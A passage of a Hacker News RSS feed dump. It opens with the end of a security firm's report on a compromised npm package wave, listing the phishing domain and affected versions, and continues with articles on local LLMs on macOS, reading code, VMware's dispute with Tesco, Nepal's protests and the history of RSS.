recipients, approvals, allowances).Even if the UI looks correct, the signed transaction routes funds to the attacker.Stays stealthyIf a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.Keeps silent hooks running in the background to capture and alter real transactions.‍The phishing emailThe maintainer shared that he was compromised by the use of phishing, using this email coming from support [at] npmjs [dot] help :The domain was registered just three days ago on September 5th, 2025:‍Maintainer responseAfter Aikido notified the maintainer on Bluesky, he replied at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.‍The author also shared that the phishing email was sent from support [at] npmjs [dot] help .The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the package simple-swizzle is still compromised.‍The author further commented on HackerNews:‍Attackers target another maintainerAt 16:58 UTC, our system detected another package, which was comrpomised by what appears to be the same attackers:proto-tinker-wc@0.1.87 ‍The file dist/cjs/proto-tinker.cjs.entry.js contains the malicious code:‍Indicators of compromisePhishing domain‍npmjs.help ‍Package versions
  
    
      Package
      Version
    
  
  
    backslash0.2.1
    chalk-template1.1.1
    supports-hyperlinks4.1.1
    has-ansi6.0.1
    simple-swizzle0.2.3
    color-string2.1.1
    error-ex1.3.3
    color-name2.0.1
    is-arrayish0.3.3
    slice-ansi7.1.1
    color-convert3.1.1
    wrap-ansi9.0.1
    ansi-regex6.2.1
    supports-color10.2.1
    strip-ansi7.1.1
    chalk5.6.1
    debug4.4.2
    ansi-styles6.2.2
  
Malware ResearcherCharlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.September 8, 2025AutoTriage Integration in IDEAikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fixTags/September 2, 2025Aikido for Students and EducatorsAikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.Tags/September 2, 2025Free hands-on security labs for your studentsAikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.Tags/Get secure for freeSecure your code, cloud, and runtime in one central system.Find and fix vulnerabilities fast automatically.No credit card required |Scan results in 32secs.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Will Amazon S3 Vectors Kill Vector Databases–Or Save Them?]]></title>
            <link>https://zilliz.com/blog/will-amazon-s3-vectors-kill-vector-databases-or-save-them</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169624</guid>
        </item>
        <item>
            <title><![CDATA[Browser Fingerprint Detector]]></title>
            <link>https://fingerprint.goldenowl.ai/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169286</guid>
            <description><![CDATA[Free advanced browser fingerprint detector. Test your device's digital footprint, check tracking uniqueness score, and understand how websites track you online. Essential tool for privacy and security research.]]></description>
            <content:encoded><![CDATA[Discover what information websites can gather about you through browser fingerprint techniques. Your privacy matters - understand your digital footprint.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Dietary omega-3 polyunsaturated fatty acids as a protective factor of myopia]]></title>
            <link>https://bjo.bmj.com/content/early/2025/08/17/bjo-2024-326872</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169157</guid>
        </item>
        <item>
            <title><![CDATA[Experimenting with Local LLMs on macOS]]></title>
            <link>https://blog.6nok.org/experimenting-with-local-llms-on-macos/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45168953</guid>
            <description><![CDATA[A developer's guide to downloading and running LLMs on macOS, for experimentation and privacy.]]></description>
            <content:encoded><![CDATA[September 08, 2025 · 9 minutes to read
So, this blog post will be about LLMs, and everyone has opinions about that. To be upfront about it, I’m a skeptic (bordering on hater), yet I like experimenting with stuff so I download and run them locally on my Mac. And I’ll teach you how to do it too, if you’d like!

      
    
  
  
    
Some call them fancy autocomplete, some argue that they are sentient and should have rights. The truth is somewhere in between. Yes, they perform next word prediction, but it’s so complex that there’s nontrivial emergent behavior. No, they don’t have creativity or a mind. I believe one day we can create sentient machines, but not in this current iteration, maybe not before we go extinct.
Now that we’re out of the science fiction territory, let’s talk about their strengths. Laurie has a great post about it, which I highly recommend, but in summary they are generally good at summarizing text, regurgitating home maintenance advice from reddit, or telling you that you have cancer.
I also use them for brain-dumping. I find it hard to keep a journal, because I find it boring, but when you’re pretending to be writing to someone, it’s easier. If you have friends, that’s much better, but some topics are too personal and a friend may not be available at 4 AM.
I mostly ignore its responses, because it’s for me to unload, not to listen to a machine spew slop. I suggest you do the same, because we’re anthropomorphization machines and I’d rather not experience AI psychosis. It’s better if you don’t give it a chance to convince you it’s real. I could use a system prompt so it doesn’t follow up with dumb questions (or “YoU’Re AbSoLuTeLy CoRrEcT”s), but I never bothered as I already don’t read it.
Lastly, I’m interested in them because it’s tech and I like tech. I don’t believe they make you that much productive, and I never let them write for me. When I ask it something, I always fact-check, they are known to hallucinate (or bullshit, if you prefer) and I’ve experienced this too many times to trust it. Most importantly, just avoid asking questions that can’t be easily verified, there’s enough fake news around anyway.
You may be asking, “Well I can do everything you said with ChatGPT free tier, why bother running them locally?” There are a few reasons, and I’ve already mentioned them briefly:


I like experimenting with things. It’s marvelous that you can download this 12 GB file and your computer talks to you marginally better than ELIZA! Joking aside, we accepted the concept of LLMs too quickly, when the truth is that we never expected computers to figure out human speech before robots were walking among us. So it feels a bit magical when my computer has better grammar than I do, and I can summon one whenever I want without a supercomputer.


People have secrets and some secrets shouldn’t leave your computer. Companies are not well equipped to keep your sensitive data, and current trends show that they can retain your data or use it for training. I feel like a local LLM is a better choice for these use cases.


I don’t feel comfortable giving money to the AI companies. Every single one of them has done some kind of unethical thing, and the way the AI race is going, a hypothetical ethical one will be left behind. They intentionally hype AI, destroy the environment, and plagiarize people’s hard work. I’m thankful for the open-weight models they provide and will keep using them, luckily they can’t take that away from me.


If you still want to run an LLM on your macOS1, let’s get started. There are two options that I recommend, one is open-source and the other is easier to use, as all things are. I only cover macOS because that’s what I have; if that’s not your platform, you can still follow this guide with platform-specific tweaks, or find another guide.
Llama.cpp
It’s created by Georgi Gerganov and works really well with a ton of configuration options. It supports a lot of platforms, can download models, and has a basic web UI for convenience. You can install it with Nix using the following command: nix profile install nixpkgs#llama-cpp. For other installation methods, check their instructions.
To download and run a small and good enough model for experimentation, I recommend Gemma 3 4B QAT, which you can do with the following command:
$ llama-server -hf ggml-org/gemma-3-4b-it-qat-GGUF
If you open your web browser and navigate to http://127.0.0.1:8080, you’ll see a very bare bones web UI that’s eerily similar to ChatGPT, but that should be enough. You can experiment with it and exit the server once you’re done.
LM Studio
This is the closed-source but easier to use one. It has a superb UI that lets you browse models, manage downloads, organize chats, and even tells you if a model can run on your machine. It has guardrails so you don’t crash your system by loading a model that’s too large. I like using it a lot, but enshittification is always a risk with closed-source for-profit software.
You can download a DMG from its website and install it as usual. LM Studio has two runtimes on macOS, llama.cpp which we covered earlier, and MLX, which is an ML engine developed by Apple and runs a bit faster, but offers less configuration in the UI. (I didn’t try running MLX directly, maybe it’s configurable but not exposed.)
I will not provide a walkthrough because this is not a product tour and the UI is pretty user-friendly anyway. I can give you some tips and tricks though.

You can switch the model mid-conversation, it won’t have any problem
You can branch off the current conversation, which is good for experimentation
You can regenerate the assistant message, like ChatGPT
You can edit your own messages, also like ChatGPT, but you can also edit assistant messages, which allows you to put words into its mouth
You can create presets for system prompts and reuse them for different personas
There are a lot of model settings you can configure; for example, you can customize the context overflow behavior when the context grows larger than the context window (the default is to truncate the middle, so first and last messages are kept, which is a good default)

How to choose a good LLM for your use case
Right now there are a lot of open-weight models around, almost all AI companies have released one. There are a few things you need to pay attention to when choosing a model. These things take a lot of disk space so be mindful of filling your disk!
Model size
You may have plenty of free space on your drive, but for the LLM to work you need to load it into memory. So your RAM is the bottleneck. Since the operating system also needs memory to work, if you have 16 GB RAM, like me, then models should be less than 12 GB. Loading larger models may cause you to run out of memory, your system will be unresponsive, and you’ll have to perform a hard reboot. Larger models will also run slower.2
Runtime
If you’re using llama.cpp directly, or as the runtime in LM Studio, you need GGUF models. If you’re using the MLX runtime in LM Studio, you need MLX models. As mentioned before, MLX models run slightly faster, but GGUF models provide more configuration, and since they can run on many platforms they are ubiquitous and better tested.
Quantization
Most LLMs are trained at 16-bit precision, but you can downcast (or quantize) the weights to lower precision and they still perform well up to some point. The sweet point is around 4 bits, which is noted as Q4. LM Studio defaults to this.
Quantization is a rabbit hole; different kernels are used for quantization, which is included in the notation, such as Q4_K_M, which is a bit too much for me and I decided against learning it. Just download the default and be done with it.
Vision models
Some models can tokenize image inputs and can “see” what’s inside them. This feels pretty magical; they can read text, recognize objects, and determine the mood or art style. You can use them as basic OCRs but in my experience dedicated OCRs perform better at serious tasks, LLMs tend to make shit up when they can’t read.
Reasoning
Some models can “think” before generating an answer, which is sometimes called “inference time scaling”3. The general wisdom is that smaller reasoning models can compete with larger non-reasoning models, which is reflected in benchmarks. The downside is that it takes longer to get an answer. So you need to decide if you want a larger but smarter model, or a smaller one that reasons. Keep in mind that reasoning sometimes takes minutes, and fills up the context pretty quickly.
Tool use
Some models are taught to emit special tokens that can call tools specified in the system prompt with the correct arguments. LM Studio has a UI for adding MCP servers and managing the capabilities provided by them.
By default, LM Studio asks you to confirm each tool call request, which is great for security. Tool calls are commonly used for data exfiltration attacks, which is as bad as it sounds.
LM Studio by default comes with a JavaScript MCP, powered by Deno, which provides the LLM the ability to execute code in a sandbox. This is really powerful, you can make it perform hard calculations, analyze data, even generate random numbers. I created a number guessing game, which works better than expected.
You can also plug in a web search MCP to give it up-to-date knowledge retrieval capabilities. Since small models have limited world knowledge, this makes them work remarkably well for applicable use cases. I have used Exa’s free tier for this, which worked well.
Lastly, if you want a model to have long-term memory, there are a ton of MCPs that can do that. But keeping with the theme of keeping things local, I found MCP server for Obsidian to be a good candidate.
One thing to keep in mind regarding MCPs is that since they have to teach the model about themselves, they pollute the context pretty quickly, so be sure to only enable those you need.
Aside: Agents
“Agents are models using tools in a loop.” So a model that has both reasoning and tool use capabilities hits a sweet spot, and is commonly called an “agent”. These can call tools repeatedly while reasoning, and provide a complete answer. The truth is far from perfect, in my experience, but it’s still a cool concept.
Finding a good model
LM Studio has a built-in UI for finding models, which shows runtime, quantization, model capabilities, and size in a user-friendly way. For llama.cpp, you can check Hugging Face for GGUF models.
You may not find a model that hits all the capability boxes, so it’s better to download a variety of models and experiment with them. Here are some of my favorites, in no particular order:

Gemma 3 12B QAT: for visual intelligence and it’s generally a good non-reasoning model that’s fast and produces good text
Qwen3 4B 2507 Thinking: This is the updated version of Qwen3 4B, which also has a non-reasoning variant; it’s really small, fast, and good quality for its size
GPT-OSS 20B: The largest and most capable model that can run on my machine, has three levels of reasoning; it’s rather slow but very capable, smartest of all
Phi-4 (14B): It was my favorite before GPT-OSS, now has reasoning and reasoning plus variants, but I haven’t used it lately

Final words
Small models may not replace frontier models in terms of speed or quality, but I still see utility in them. Running them locally is also a good test bed for understanding how they work and learning to work around their weaknesses.
Let me part with a final tip: LM Studio shows you how much of the context window is being used. So you may find it useful to ask for it to summarize the conversation so far, when the context window gets close to being filled. This way you can help it remember important information that it would otherwise forget.4
Have fun with your brand new genie in your computer!
Thanks to Jull for reviewing an early draft, and my girlfriend for the leekspin hero image.



With an M-series, Apple Silicon chipset, Intel chips are pretty old at this point and wouldn’t run LLMs well↩
You may be wondering about performance and if it will be usable. When you generate a model response, two things happen in sequence; prompt processing and token generation. Prompt processing is tokenizing the entire chat history, is done in parallel, and compute bound. Token generation is sequential, and is memory bandwidth bound. Both of these things get slower as the context size increases.

Also, counterintuitively, these models don’t run on the Neural Engine. Both llama.cpp and MLX run on the GPU, using Metal shaders. I’m not entirely sure why though.↩
It’s called that because the common wisdom is that models reason with tokens, and a smaller model can generate a higher quality response if it generates more tokens. To protect the user from the burden of reading through more slop, these reasoning tokens are usually hidden from the user.↩
This is called compaction and, coding tools such as Claude Code can do this automatically, or provide a command for you to trigger it manually.↩

Share on Bluesky · Edit on GitHub]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Australian startup joins race to build local ChatGPT]]></title>
            <link>https://www.afr.com/technology/we-can-do-it-for-under-100m-start-up-joins-race-to-build-local-chatgpt-20250908-p5mt5o</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45168883</guid>
            <description><![CDATA[Sovereign Australia AI has unveiled plans to build Australis, a local alternative to the AI models of tech giants OpenAI, Anthropic, Google and Meta.]]></description>
            <content:encoded><![CDATA[Two Australian entrepreneurs have joined the race to build a local alternative to the artificial intelligence models created by tech giants like OpenAI and Meta, earmarking $10 million to compensate copyright owners for their work.Sovereign Australia AI was founded by AI strategist Simon Kriss and technology executive Troy Neilson who shared concerns that Australia’s access to the critical technology would be at the mercy of the decisions made in the United States or China.Loading...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Meta suppressed research on child safety, employees say]]></title>
            <link>https://www.washingtonpost.com/investigations/2025/09/08/meta-research-child-safety-virtual-reality/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45167705</guid>
            <description><![CDATA[The company’s lawyers intervened to shape research that might have shed light on risks in virtual reality, four current and former staffers have told Congress. Meta denies the allegations.]]></description>
            <content:encoded><![CDATA[At her home in western Germany, a woman told a team of visiting researchers from Meta that she did not allow her sons to interact with strangers on the social media giant’s virtual reality headsets. Then her teenage son interjected, according to two of the researchers: He frequently encountered strangers, and adults had sexually propositioned his little brother, who was younger than 10, numerous times.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Writing Code Is Easy. Reading It Isn't]]></title>
            <link>https://idiallo.com/blog/writing-code-is-easy-reading-is-hard</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45167459</guid>
            <description><![CDATA[Writing code is easy. Once you have a solution in mind, and have mastered the syntax of your favorite programming language, writing code is easy. Having an LLM write entire functions for you? Even eas]]></description>
            <content:encoded><![CDATA[




	

Writing code is easy. Once you have a solution in mind, and have mastered the syntax of your favorite programming language, writing code is easy. Having an LLM write entire functions for you? Even easier. But the hard part isn’t the writing. It’s the reading. It’s the time it takes to load the mental model of the system into your head. That’s where all the cost really is.

A mental model is the thing you build when you read code. It’s your internal map of how the system works, where the tricky parts are, what depends on what. Without it, you’re just staring at lines of text.

When I worked as a contractor, most of my jobs started the same way. I’d get a task to fix a bug or add a new feature in an application I’d never seen before. My mental model was clean and empty at first. To start filling it, I’d check the homepage to see what it looked like. I’d look at the page source: is this React? jQuery? A third-party plugin? I’d scan the codebase to see if the carousel they are requesting on the front page was used elsewhere. I’d check their build process, their testing setup, the tools they leaned on. Every little detail I discovered got appended to the model in my head.

It was like moving into a new city. You start at the foot of your apartment, wander a few streets, notice which roads lead to the freeway, where the grocery store is, and slowly you start to orient yourself. That’s what reading code feels like: you’re building a mental map so you don’t get lost every time you move around.

Say you need to understand a simple function like getUserPreferences(userId). To build your mental model, you need to trace:


Where is this function defined?
What does it return? Is it a Promise? What's the shape of the data?
Does it hit a database directly or go through an API?
Are there caching layers involved?
What happens if the user doesn't exist?
Who else calls this function and in what contexts?
Are there side effects?


Understanding that one function means jumping between database schemas, API definitions, error handling middleware, and multiple call sites. Only after building this web of relationships do you have enough context to safely modify anything.

And it’s slow. Reading code is harder than writing it. Much harder. Writing code is forward motion: you’re laying down fresh pavement. Reading code means retracing someone else’s steps, which usually means jumping between files, chasing function calls, inferring side effects, and deciphering intentions that aren’t written down. Understanding one function often means looking at five other files. Only after all that do you have enough of a map to even begin.

It’s the same reason debugging is harder than coding. On Stack Overflow, one of the most common comments you’ll see under a bad question is: “Can you show us what you did?” Without seeing the steps, no one can load the right model in their head to help. It’s also why the XY problem keeps coming up. People ask about a symptom without giving the context that would let others reconstruct the whole picture.

I'm still fascinated by the lawyer who used ChatGPT in court. He filed a brief that cited six cases which turned out not to exist. Everyone asked: why didn’t he read them? The answer is the same: it takes time and effort to build the model. He would have had to chase down each case, read them, and slot them into a broader understanding of legal precedent. Reading is the hard part. Generating is easy.

Reading isn't just about going through the code and examining it line by line. It's also about going through the documentation, code reviews, and peer programming. In fact, these are solutions for accelerating the process of building our mental model. But with that in mind, you still have to, well, read and understand. You'll notice that programmers often want to rewrite things from scratch, because "the old code sucks". What sucks is taking the time to read and understand it.

And this is what makes LLMs both powerful and dangerous in programming. Whether the AI generates perfect code or complete hallucinations, you still have to read it. You still have to trace through what it’s supposed to do, how it interacts with the rest of the system, and what the side effects are. The longer the generated code, the longer it takes to build your mental model. And only once you’ve done that can you spot the issues, the places where the generated code doesn’t quite fit, or quietly breaks something else.

When an LLM can produce an infinite amount of code or text, it tempts us to skip the reading. But you can’t skip the model. You wouldn’t want to load someone else’s saved game and be dropped in the middle of a boss fight. That’s what it feels like to inherit or generate code you don’t understand.

This is why the real bottleneck in software development isn’t writing, it’s understanding.



For now, we don't have the LLM equivalent for understanding. Something that could instantly transfer a complete mental model from the system to your head. Until we do, the bottleneck hasn't moved. We've solved the "typing speed" problem. We can generate more code than we could ever hope to read. But until we solve the "understanding" problem, the cost of software development remains the same: the time it takes for someone to make sense of it all.

This has real implications for how we use AI tools. Instead of asking AI to generate large blocks of code, we might be better off asking it to help us understand existing code. Instead of measuring productivity by lines of code written, we should measure it by how quickly teams can build accurate mental models of their systems.

The future of programming might not be about generating more code faster. It might be about generating understanding faster. And that's a much harder problem to solve.

	

	
	]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[A complete map of the Rust type system]]></title>
            <link>https://rustcurious.com/elements/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45167401</guid>
            <description><![CDATA[A complete map of the Rust type system]]></description>
            <content:encoded><![CDATA[
            RustCurious.com
            
                A clickable visual guide to the Rust type system.
                Every type possible in Rust falls into one of the boxes shown.
            
            
                The focus here is on
                lang_items
                – types and traits built into the language to support specific syntax.
                The purpose is to demystify what can be built purely in library code. For example,
                Vec,
                String and
                HashMap
                do not appear here because those are just structs.
                Rust's clear delineation of a platform-independent
                core
                enables no_std crates in embedded firmware and other systems-level contexts where no dynamic heap is available.
                (discussion)
            
            
                Ben Williamson, 2025
            
            
                Free Rust course: @RustCurious      
            
        ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Indiana Jones and the Last Crusade Adventure Prototype Recovered for the C64]]></title>
            <link>https://www.gamesthatwerent.com/2025/09/indiana-jones-and-the-last-crusade-adventure-prototype-recovered-for-the-commodore-64/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45167245</guid>
            <description><![CDATA[A huge Commodore 64 surprise to kick off the week with Games That Weren't adding the sadly cancelled playable prototype of the Indiana Jones 3 adventure. An unofficial conversion of the great Lucasfilm Games title with bags of promise, but wasn't to be.]]></description>
            <content:encoded><![CDATA[HomeAboutTeam25 years of Games That Weren’tA talk at Retro CollectiveUnreleased & Cancelled gamesUncategorized reviewsVIC-20Recent updatesC64Browse GTW64Still in productionWantedAbout GTW64Prototypes & UnusedPreservationFeaturesBonus book contentContactSubmit an entryLinksArchive A-Z links | Search archive0ABCDEFGHIJKLMNOPQRSTUVWXYZA huge Commodore 64 surprise to kick off the week with Games That Weren’t adding the sadly cancelled playable prototype of the Indiana Jones 3 adventure. An unofficial conversion of the great Lucasfilm Games title with bags of promise, but wasn’t to be. Check it out here:https://www.gamesthatwerent.com/gtw64/indiana-jones-and-the-last-crusade-adventure/Share this page:DISCLAIMER: We are a non-profit digitisation project, aiming to digitally preserve software and history which would otherwise be lost for good. If for any reason there is anything that you do not wish to be on the website, please contact us for removal.Games That Weren't® is the registered trademark of Frank Gasking.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[VMware's in court again. Customer relationships rarely go this wrong]]></title>
            <link>https://www.theregister.com/2025/09/08/vmware_in_court_opinion/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45167239</guid>
            <description><![CDATA[Opinion: Have you ever seen the 'Are we the baddies' sketch, Broadcom?]]></description>
            <content:encoded><![CDATA[
Opinion If you're a tech company marketing manager writing white papers, you'll love a juicy pull quote. That's where a client says something so lovely about you, you can pull it out of the main text and reprint it in a big font in the middle of the page.
"VMware is essential for the operations of Tesco's business and its ability to supply groceries" is a great candidate from 2019.
Broadcom's answer to VMware pricing outrage: You're using it wrong
READ MORE
Or it would be, if it wasn't followed by accusations of massive contractual misbehavior threatening the client, and requests for many millions of dollars in damages – and rising. What looks great as marketing blurb isn't so hot on a court filing.
What a filing it is, too. Tesco is the UK's biggest supermarket chain by revenue, with around 40,000 server workloads keeping the ship afloat. Before Broadcom swallowed VMware, Tesco bought perpetual licenses and support that could run to 2030. Broadcom, Tesco claims, is refusing to honor the support contracts until Tesco switches to new licenses. This, it is further claimed, puts the retail giant at risk of being unable to operate.
Thus, Tesco is looking for damages of £100 million and rising from Broadcom, VMware, and the somewhat unfortunate reseller Computacenter. It's hard to feel sorry for a reseller. That's how bad this is.

    

Assuming Tesco's claims are true, this is extortion. Running an enterprise on unsupported software, while not exactly unknown, is corporate malpractice. Running unsupported software on which your entire business depends is nigh on suicidal. But who's holding the gun here?

        


        

Pulling patches, support, and upgrades that you are contractually obliged to provide, while demanding more money for a worse deal, doesn't look like being a good partner. It looks like running a protection racket. It looks like extortion. Nice multibillion business you've got there, man. Shame if anything, y'know, happened to it.
Can we assume Tesco is entirely accurate in its claims? Not until the case is heard, but the circumstantial evidence is there. The affair is in danger of turning into a class action lawsuit. The UK company is joining Siemens and AT&T.

        

Perhaps Broadcom has never lost similar cases? Um, no. Perhaps Broadcom is putting up a spirited public defense, rather than blaming its clients for doing it wrong? Um, no. Surely, it couldn't be so crass as to say its new licensing policy is not only blameless but very popular because it's bringing in so much more money, man, rather than 1,000-percent-plus price hikes? It is. All these stories are from just three months this year.
As The Register's European editor wearily remarked: "Search the site for Simon and VMware. We've got pages of this stuff. Go. Look."


How Windows 11 is breaking from its bedrock and moving away

Two wrongs don't make a copyright

When hyperscalers can't safeguard one nation's data from another, dark clouds are ahead

Fear of the unknown keeps Broadcom's VMware herd captive. Don't be cowed

It's not hard to guess Broadcom's motivation. Perpetual licenses can be a very bad idea for a vendor unless carefully constructed to be not really perpetual at all – the thing being licensed can cease to be under agreed conditions, for example. You can unilaterally revoke them if your client base is too poor to sue, or you have an off-ramp that doesn't hurt too much. Neither seems to be the case here, in which case you negotiate with the licensees. If you try to strong-arm your clients by removing support, especially contracted support, you are not only acting unethically, to say the least, you are putting both you and your client at tremendous risk. Plus, you look like a gangster betting that a company will cave from fear of the consequences rather than stick it out.
Broadcom's policy seems to accept that. And the bigger the client, the better. Bigger equals more pressure, right? To which the right answer is do you feel lucky, punk? Do you think you'll win in court?
Does Broadcom think there's no real chance of a big client getting crippled because it didn't honor a contract and bad things happened? Better pray that doesn't happen.

        

Even if you win, somehow voiding the contracts that were signed in good faith and that so many of your best clients are confident taking to court, then what? Migrations will flock faster than swallows, African or European. If you're reading this, Broadcom, click on that search link above.
Broadcom admits it's sold a lot of shelfware to VMware customers
READ MORE
Ask yourself: would you want to trust your company to someone like that? How does someone like that look to the industry? If you didn't answer arrogant, greedy, unethical, untrustworthy, and full of it, why not?
While your respectable, blue-chip, long-established clients are taking you to court because they can find no other responsible way to continue to use your product, consider how many enemies you want to make before it becomes too many. Sure, court cases can be part of hardball negotiation, yet that's not what this looks like.
At some point, this has to stop. Virtualization, even as a deeply embedded framework, is a layer in the stack that can be replaced. The equation of migration is always complicated. It balances risk versus reward, ROI, inertia, future roadmaps, and more. Overarching it all is trust.
When you look in the mirror, Broadcom, what do you see? ®                                
                    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[14 Killed in anti-government protests in Nepal]]></title>
            <link>https://www.tribuneindia.com/news/world/massive-protests-in-nepal-over-social-media-ban/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45166972</guid>
            <description><![CDATA[Nepali police fire tear gas and rubber bullets at protesters outside parliament.]]></description>
            <content:encoded><![CDATA[At least 19 people were killed and more than 300 others injured on Monday after police used force during protests by youths that rocked the Nepalese capital and other parts of the country over the government's ban on social media sites, officials said.Thousands of youths, including school students, under the banner of Gen Z, converged in front of Parliament in the heart of Kathmandu and shouted anti-government slogans demanding immediate revocation of the ban. The protests spread to Pokhara, Butwal, Bhairahawa, Bharatpur, Itahari and Damak.Nepal Police spokesperson Binod Ghimire said 17 people were killed in clashes in various parts of Kathmandu during the rally, and two protesters died in Sunsari district of eastern Nepal in police firing.Home Minister Ramesh Lekhak, who represents the Nepali Congress party in the coalition government led by Prime Minister KP Sharma Oli, has resigned on moral grounds, the Nepali Congress sources said.The Nepali Army was deployed in the capital after the situation intensified during the protest. The army personnel have taken control of the roads surrounding the parliament complex in New Baneshwor.The demonstration turned violent when some protesters entered the Parliament complex, prompting police to use water cannons, tear gas, and live rounds to disperse crowds, eyewitnesses said.Citing hospital officials, The Kathmandu Post newspaper reported that eight people died at the National Trauma Centre, three at Everest Hospital, three at Civil Hospital, two at Kathmandu Medical College, and one at Tribhuvan Teaching Hospital.Citing the Ministry of Health, the paper said that hospitals across the country are treating at least 347 injured protesters - Civil Hospital 100, Trauma Centre 59, Everest 102, KMC 37, Bir Hospital six, Patan Hospital four, Tribhuvan Teaching 18, Norvic three, BP Koirala Institute of Health Sciences two, Gandaki Medical College one, Birat Medical College four, and Damak Hospital seven.The Himalayan Times newspaper said that hospitals, including Civil Hospital and Trauma Centre, are struggling to accommodate patients and have begun referring them to other facilities.Following the violence, the local administration imposed a curfew in several parts of the capital. Besides Kathmandu, curfew orders have been issued in Lalitpur district, Pokhara, Butwal and Itahari of Sunsarai district.“No movement of people, demonstration, meeting, gathering or sit-in will be allowed in the restricted zone,” Chief District Officer Chhabi Lal Rijal said in a notice.The local administration later extended the restrictive order to various areas surrounding Rastrapati Bhawan, the Vice-President's residence and the Prime Minister's Office.The government on Thursday banned 26 social media sites, including Facebook, WhatsApp, X, Instagram and YouTube, for failing to register with the Ministry of Communication and Information Technology within the given deadline.The government has clarified its stance that the social media sites were banned to bring them under regulation. But the general perception among the masses is that this will lead to an attack on free speech, and it may lead to censorship.Prime Minister Oli on Sunday said that his government would “always oppose anomalies and arrogance, and would never accept any act that undermines the nation”.The prime minister said the party is not against social media, “but what cannot be accepted is those doing business in Nepal, making money, and yet not complying with the law”.Referring to the criticism over the move, he called protesters and agitating voices “puppets who only oppose for the sake of opposing”.Dozens of journalists demonstrated at Maitighar Mandala in the heart of Kathmandu on Sunday, protesting against the government's decision to ban 26 social media platforms.Separately, the Computer Association of Nepal (CAN) in a statement said that shutting down important platforms like Facebook, X, and YouTube all at once can have a serious impact on education, business, communication, and the daily lives of ordinary citizens.“This move of the government also poses the risk of Nepal falling behind the world digitally,” CAN president Sunaina Ghimire said, adding that sufficient discussions should be held with stakeholders to bring practical solutions.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[The story of how RSS beat Microsoft]]></title>
            <link>https://buttondown.com/blog/rss-vs-ice</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45166750</guid>
            <description><![CDATA[Massive tech companies tried to own syndication. They failed.]]></description>
            <content:encoded><![CDATA[People like to tell the story of how VHS beat Betamax because adult film studios backed VHS. It’s a clutch-your-pearls story that says nothing about why these multi-million-dollar businesses picked one format over the other. The real story is that while Betamax tapes had better resolution and fidelity, VHS was cheaper, offered longer recordings, and, most importantly, was the more open format. Not many people talk about how or why RSS won the content syndication war because few people are aware that a war ever took place. Everyone was so fixated on the drama over RSS’s competing standards (Atom vs RSS 2.0) that they barely registered the rise and fall of the Information and Content Exchange (ICE) specification, which had been created, funded, and eventually abandoned by Microsoft, Adobe, CNET, and other household names. ICE was the Betamax to RSS’s VHS. The Information and Content Exchange standard was more advanced, more expensive, less open, and unable to counter the overwhelming number of bloggers who flooded the market with DIY-friendly RSS feeds.The dawn of war over syndicationWhen Pew Research informally asked readers about online activities that had lost their charm, most of the responses mentioned surfing the web, something people used to do for the hell of it, just to see what was out there. That was in 2007, the same year the iPhone launched, long before most of us were addicted to social feeds. One user complained that “the net is no longer a toy but more like a Velveteen Rabbit — while some loved parts have worn away or disappeared, other parts are still in place.” People hadn’t lost interest in surfing so much as the waves of content had grown to crushing heights.Big-name publishers got a whiff of monetization and became obsessed with content syndication. They figured that if they could make it easier for websites to repackage and republish their articles and eCommerce catalogs, corporate content creators wouldn’t need to worry about declining traffic to their sites. They could simply make a deal with whichever site was currently in vogue.“Syndication will evolve into the core model for the Internet economy, allowing businesses and individuals to retain control over their online personae while enjoying the benefits of massive scale and scope,” Kevin Werbach wrote in the July ‘99 issue of Release 1.0. “The foundations for pervasive Web-based syndication are now being laid.”The first attempt came in the form of the Information and Content Exchange (ICE) standard, which, like Betamax, predated its archrival by almost exactly a year. ICE’s stated goal in a March 1998 proposal was to standardize how data posted to one website could be automatically published on other websites. It was unapologetically commercial from day one, promising to “expand publishers’ electronic sales by making it easier to license the same material to multiple sources.”The My Netscape Network port via Scripting NewsRSS entered the game as a humble widget on the experimental My Netscape Network portal. Any website owner who used Netscape’s nascent XML-adjacent tags to create a feed of their website’s updates could have said feed added to Netscape’s list of 600+ “channels”. When a user picked a channel from the list, it added a widget to their personalized My Netscape Network page, aggregating their favorite blogs and news sites on a single page.ICE and RSS had a lot in common. Both used XML to create a common language between syndicators and subscribers. Both used self-describing tags to differentiate content elements. And both let subscribers “pull” the latest feed at any time. Philosophically, though, they couldn’t have been further apart.Revenue vs readershipOne of the creators of ICE was Vignette, famous for its StoryBuilder content management software. They ceded technical development to a consortium that included Microsoft, Adobe, Reuters, and others, while focusing on commercial development. In 1999, Vignette invested $14 million in the iSyndicate platform in exchange for iSyndicate moving exclusively to ICE, while shopping around their proprietary ICE server–priced at $50,000–to other publishers.The first desktop RSS aggregator via Internet ArchiveMeanwhile, RSS was sprinting in the opposite direction. Headline Viewer was released in April 1999 as a free desktop feed aggregator that promised to let users “Watch mailing lists! Watch weblogs! Be cool!” It was soon followed by the first web-based 